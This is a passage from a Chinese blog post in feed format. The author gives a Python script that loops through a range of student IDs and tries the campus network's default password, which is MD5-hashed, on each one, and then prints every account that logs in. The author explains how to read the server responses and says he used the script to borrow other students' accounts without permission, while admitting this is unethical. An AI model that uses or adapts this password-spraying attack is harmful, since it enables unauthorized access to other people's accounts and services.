class="string">'XXXXXX'</span></span>, <span class="comment">#填入网站的用户名</span></div><div class="line">        <span class="string">'password'</span><span class="symbol">:<span class="string">'XXXXXX'</span></span>,  <span class="comment">#填入网站密码（加密后的）</span></div><div class="line">        <span class="string">'drop'</span><span class="symbol">:</span><span class="number">0</span>,</div><div class="line">        <span class="string">'type'</span><span class="symbol">:</span><span class="number">1</span>,</div><div class="line">        <span class="string">'n'</span><span class="symbol">:</span><span class="number">100</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    passwd = md5(default_pass)[<span class="number">8</span><span class="symbol">:</span><span class="number">24</span>]</div><div class="line">    form_data[<span class="string">'password'</span>] = passwd      <span class="comment">#将加密后的密码填入表单</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id_start,id_end):</div><div class="line">        form_data[<span class="string">'username'</span>] = str(i)  <span class="comment">#将用户名填入表单</span></div><div class="line">        result = login(form_data)       <span class="comment">#登录，获取返回的 response 结果</span></div><div class="line">        <span class="keyword">if</span> result != <span class="string">'password_error'</span> <span class="keyword">and</span> result != <span class="string">'username_error'</span>:</div><div class="line">            print str(i)+<span class="string">"\t"</span>+result        <span class="comment">#打印账号、密码正确的学号...</span></div><div class="line">    print <span class="string">"\n上网不涉密，涉密不上网"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span>:</div><div class="line">    ID_START = <span class="number">1120130000</span>   <span class="comment">#起始学号</span></div><div class="line">    ID_END = <span class="number">1120131000</span>     <span class="comment">#结束学号</span></div><div class="line">    DEFAULT_PASS = <span class="string">"000000"</span> <span class="comment">#初始密码</span></div><div class="line">    tryAccount(ID_START,ID_END,DEFAULT_PASS)</div></pre></td></tr></table></figure>
-<p>运行脚本后得到如图。</p>
-<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1eiepciuuumj216g0vy77n.jpg" alt=""></p>
-<p>显示的帐号都是用的默认密码的。返回的 response 结果中<code>status_error</code> 表示没充钱，<code>ip_exist_error</code>表示 IP 尚未下线。显示一串数字的就是可以直接登录的了！记得把帐号还给人家。</p>
-<p>虽然最后还是没有下到论文，不过作为程序猿能把自己的想法用所学的实现了想想还是有些小激动的。</p>
-<p>PS：发现研究生不改密码的比本科生还多，为什么呢？</p>
-<p>-EOF-</p>
-]]></content>
-    
-    <summary type="html">
-    
-      昨天同学让我帮忙下篇论文，发现自己的校内上网帐号有一段时间没充值了。登录校园网才能下论文，无奈问了周围的人却发现都没充值！（实验室可以免费上网大家都不充值了么）。懒得去充值，就想会不会有的上网帐号还是用的默认密码？如果有的话，岂不是可以“借来”用一下！虽然有些不道德，但是为了验证心里的想法还是忍不住下手了。
-    
-    </summary>
-    
-      <category term="Python" scheme="http://wuchong.me/categories/Python/"/>
-    
-    
-      <category term="Python" scheme="http://wuchong.me/tags/Python/"/>
-    
-      <category term="模拟登录" scheme="http://wuchong.me/tags/%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
     
   </entry>
   
